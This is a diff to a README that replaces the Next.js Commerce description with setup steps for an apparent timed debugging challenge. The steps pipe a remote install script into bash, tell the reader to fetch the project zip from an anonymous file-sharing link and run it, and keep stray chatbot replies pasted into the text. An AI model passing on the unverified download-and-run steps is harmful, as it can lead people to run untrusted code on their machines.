@@ -1,75 +1,116 @@
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fvercel%2Fcommerce&project-name=commerce&repo-name=commerce&demo-title=Next.js%20Commerce&demo-url=https%3A%2F%2Fdemo.vercel.store&demo-image=https%3A%2F%2Fbigcommerce-demo-asset-ksvtgfvnd.vercel.app%2Fbigcommerce.png&env=COMPANY_NAME,SHOPIFY_REVALIDATION_SECRET,SHOPIFY_STORE_DOMAIN,SHOPIFY_STOREFRONT_ACCESS_TOKEN,SITE_NAME)
+### **Prerequisites**
 
-# Next.js Commerce
+**1. Install Cursor**
+Download from https://cursor.com/downloads and create a free account.
 
-A high-performance, server-rendered Next.js App Router ecommerce application.
-
-This template uses React Server Components, Server Actions, `Suspense`, `useOptimistic`, and more.
-
-<h3 id="v1-note"></h3>
-
-> Note: Looking for Next.js Commerce v1? View the [code](https://github.com/vercel/commerce/tree/v1), [demo](https://commerce-v1.vercel.store), and [release notes](https://github.com/vercel/commerce/releases/tag/v1).
-
-## Providers
-
-Vercel will only be actively maintaining a Shopify version [as outlined in our vision and strategy for Next.js Commerce](https://github.com/vercel/commerce/pull/966).
-
-Vercel is happy to partner and work with any commerce provider to help them get a similar template up and running and listed below. Alternative providers should be able to fork this repository and swap out the `lib/shopify` file with their own implementation while leaving the rest of the template mostly unchanged.
-
-- Shopify (this repository)
-- [BigCommerce](https://github.com/bigcommerce/nextjs-commerce) ([Demo](https://next-commerce-v2.vercel.app/))
-- [Ecwid by Lightspeed](https://github.com/Ecwid/ecwid-nextjs-commerce/) ([Demo](https://ecwid-nextjs-commerce.vercel.app/))
-- [Geins](https://github.com/geins-io/vercel-nextjs-commerce) ([Demo](https://geins-nextjs-commerce-starter.vercel.app/))
-- [Medusa](https://github.com/medusajs/vercel-commerce) ([Demo](https://medusa-nextjs-commerce.vercel.app/))
-- [Prodigy Commerce](https://github.com/prodigycommerce/nextjs-commerce) ([Demo](https://prodigy-nextjs-commerce.vercel.app/))
-- [Saleor](https://github.com/saleor/nextjs-commerce) ([Demo](https://saleor-commerce.vercel.app/))
-- [Shopware](https://github.com/shopwareLabs/vercel-commerce) ([Demo](https://shopware-vercel-commerce-react.vercel.app/))
-- [Swell](https://github.com/swellstores/verswell-commerce) ([Demo](https://verswell-commerce.vercel.app/))
-- [Umbraco](https://github.com/umbraco/Umbraco.VercelCommerce.Demo) ([Demo](https://vercel-commerce-demo.umbraco.com/))
-- [Wix](https://github.com/wix/headless-templates/tree/main/nextjs/commerce) ([Demo](https://wix-nextjs-commerce.vercel.app/))
-- [Fourthwall](https://github.com/FourthwallHQ/vercel-commerce) ([Demo](https://vercel-storefront.fourthwall.app/))
-
-> Note: Providers, if you are looking to use similar products for your demo, you can [download these assets](https://drive.google.com/file/d/1q_bKerjrwZgHwCw0ovfUMW6He9VtepO_/view?usp=sharing).
-
-## Integrations
-
-Integrations enable upgraded or additional functionality for Next.js Commerce
-
-- [Orama](https://github.com/oramasearch/nextjs-commerce) ([Demo](https://vercel-commerce.oramasearch.com/))
-
-  - Upgrades search to include typeahead with dynamic re-rendering, vector-based similarity search, and JS-based configuration.
-  - Search runs entirely in the browser for smaller catalogs or on a CDN for larger.
-
-- [React Bricks](https://github.com/ReactBricks/nextjs-commerce-rb) ([Demo](https://nextjs-commerce.reactbricks.com/))
-  - Edit pages, product details, and footer content visually using [React Bricks](https://www.reactbricks.com) visual headless CMS.
-
-## Running locally
-
-You will need to use the environment variables [defined in `.env.example`](.env.example) to run Next.js Commerce. It's recommended you use [Vercel Environment Variables](https://vercel.com/docs/concepts/projects/environment-variables) for this, but a `.env` file is all that is necessary.
-
-> Note: You should not commit your `.env` file or it will expose secrets that will allow others to control your Shopify store.
-
-1. Install Vercel CLI: `npm i -g vercel`
-2. Link local instance with Vercel and GitHub accounts (creates `.vercel` directory): `vercel link`
-3. Download your environment variables: `vercel env pull`
-
+**2. Install Node Version Manager (nvm)**
+Run the installation script:
 ```bash
-pnpm install
-pnpm dev
+curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh | bash
+```
+- After installation, verify with `nvm --version`.
+- If the command fails, run the following to load nvm, then try verifying again.
+  ```bash
+  export NVM_DIR="$HOME/.nvm"
+  [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
+  ```
+
+**3. Install Node.js**
+Install the latest Long-Term Support (LTS) version:
+```bash
+nvm install --lts
+```
+Verify the installation of Node.js and npm:
+```bash
+node -v
+npm -v
 ```
 
-Your app should now be running on [localhost:3000](http://localhost:3000/).
+**4. Install pnpm**
+Use npm to install pnpm globally:
+```bash
+npm install -g pnpm
+```
+Verify the installation:
+```bash
+pnpm --version
+```
 
-<details>
-  <summary>Expand if you work at Vercel and want to run locally and / or contribute</summary>
+**5. Install the Repository**
+- Download the code: https://send.vis.ee/download/7dafd63043474b1b/
+- Unzip the folder.
+- Open the folder in Cursor.
 
-1. Run `vc link`.
-1. Select the `Vercel Solutions` scope.
-1. Connect to the existing `commerce-shopify` project.
-1. Run `vc env pull` to get environment variables.
-1. Run `pnpm dev` to ensure everything is working correctly.
-</details>
+**6. Run the Application**
 
-## Vercel, Next.js Commerce, and Shopify Integration Guide
+In Cursor, open a new terminal (Cmd/Ctrl + J) and run the following commands:
 
-You can use this comprehensive [integration guide](https://vercel.com/docs/integrations/ecommerce/shopify) with step-by-step instructions on how to configure Shopify as a headless CMS using Next.js Commerce as your headless Shopify storefront on Vercel.
+```bash
+# Install dependencies
+pnpm install
+
+# Start the development server
+pnpm dev
+```
+Once the server is running, open `http://localhost:3000` in your browser.
+
+Of course. Here is a clear and concise way to add instructions for setting up a local Git repository, designed to be easy for both Mac and Windows users.
+
+---
+
+**7. Set Up Git**
+
+This allows you to track your changes as you fix bugs.
+
+**1. Install Git**
+First, check if Git is installed by running this command in your terminal:
+```bash
+git --version
+```
+If the command is not found, download and install Git from the official website: https://git-scm.com/downloads
+
+**2. Initialize the Repository**
+In your terminal, navigate to the project folder you unzipped and run:
+```bash
+# This creates a new local Git repository in the folder.
+git init
+```
+
+**3. Create the First Commit**
+It's good practice to save the initial state of the code before you begin.
+```bash
+# Stage all files for the initial commit
+git add .
+
+# Save the files with a descriptive message
+git commit -m "Initial commit"
+```
+Now you can commit your bug fixes as you work.
+
+---
+
+### **Debugging Challenge Instructions**
+
+The challenge consists of two 30-minute parts.
+
+1.  **Part One:** Using only the source code, run the application to find and fix as many bugs as possible.
+2.  **Part Two:** Using a provided list of known bugs, fix as many as you can.
+
+Got it. Here is the updated version with the mention of documentation.
+
+---
+
+### **Tips for the Challenge**
+
+**1. Describe Bugs Clearly to the AI**
+To get the best help from Cursor's AI, provide high-quality information. The more specific you are, the better the fix will be.
+
+*   **Explain the problem:** Describe what you expected to happen versus what actually happened.
+*   **Provide error messages:** Copy and paste the complete, exact error from the terminal or browser console.
+*   **Add context:** Mention which files you suspect are involved. If the bug relates to a library or API, providing a link to its documentation is very helpful.
+
+**2. Use Git to Save Your Progress**
+Version control is your safety net. It allows you to experiment without fear of losing your work.
+
+*   **Commit often:** After each successful fix, commit your changes with a clear message (e.g., `git commit -m "fix: resolve login button bug"`). This creates a safe checkpoint.
+*   **Roll back if needed:** If a change breaks the application, you can easily revert to the last working version and try a different approach.
